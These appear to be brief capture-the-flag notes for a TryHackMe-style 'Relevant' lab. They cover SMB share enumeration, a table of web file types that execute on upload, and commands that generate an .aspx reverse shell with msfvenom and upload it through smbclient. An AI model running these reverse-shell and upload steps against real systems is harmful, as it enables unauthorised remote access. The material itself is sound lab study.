`smbmap -H relevant.thm -u relevant`

It does not seem that -u is needed at all.

--------------------------------

If SMB share allows, READ and WRITE, try to put a reverse shell.

| Target            | Server-side technology | Potential execution file            |
| ----------------- | ---------------------- | ----------------------------------- |
| Windows + IIS     | ASP.NET                | `.aspx`                             |
| Windows + IIS     | Classic ASP            | `.asp`                              |
| Apache + PHP      | PHP                    | `.php`                              |
| Tomcat            | Java/JSP               | `.jsp`                              |
| Static web server | None                   | No equivalent file upload execution |

IIS is a handler for ASP.NET stuff if see this use .aspx reverse shell.


-------------

After creating a .aspx reverse shell, upload to the SMB share.

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.156.172 LPORT=9999 -f aspx -o reverse.aspx`

`smbclient -U relevant //10.49.135.50/nt4wrksv`

`put reverse.aspx`
